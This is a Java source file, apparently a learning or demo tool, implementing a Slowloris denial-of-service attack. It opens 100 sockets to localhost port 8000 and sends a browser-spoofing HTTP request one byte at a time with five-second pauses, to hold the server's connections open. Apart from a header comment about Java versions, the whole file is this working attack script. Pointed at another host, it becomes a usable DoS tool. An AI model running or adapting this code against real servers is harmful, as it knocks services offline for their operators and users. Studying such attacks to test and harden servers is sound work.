/**
* Requires JDK 25 or higher (import module)
* At least, use Java 15 for String
* For legacy Java releases, use these:
* <code>
* import java.io.*;
* import java.net.*;
* </code>
* Say NO to Java 8!
*/
import module java.base;
public class Slowloris{
	public static void main(String[] args) throws Exception{
		Socket sockets[]=new Socket[100];//100 Sockets
		for(int i=0;i<100;++i){
			sockets[i]=new Socket("localhost",8000);
			sockets[i].setTcpNoDelay(true);//One byte exactly!
		}
		String str="""
			GET / HTTP/1.1
			Host: localhost:8000
			Connection: keep-alive
			sec-ch-ua: "Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"
			sec-ch-ua-mobile: ?0
			sec-ch-ua-platform: "Linux"
			Upgrade-Insecure-Requests: 1
			User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
			Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
			Sec-Fetch-Site: none
			Sec-Fetch-Mode: navigate
			Sec-Fetch-User: ?1
			Sec-Fetch-Dest: document
			Accept-Encoding: gzip, deflate, br, zstd
			Accept-Language: zh-CN,zh;q=0.9
			
		""".replace("\n","\r\n");
		byte[] binary=str.getBytes();
		for(int i=0;i<binary.length;++i){
			for(int j=0;j<100;++j){
				sockets[j].getOutputStream().write(binary[i]);
			}
			Thread.sleep(5000);
		}
	}
}
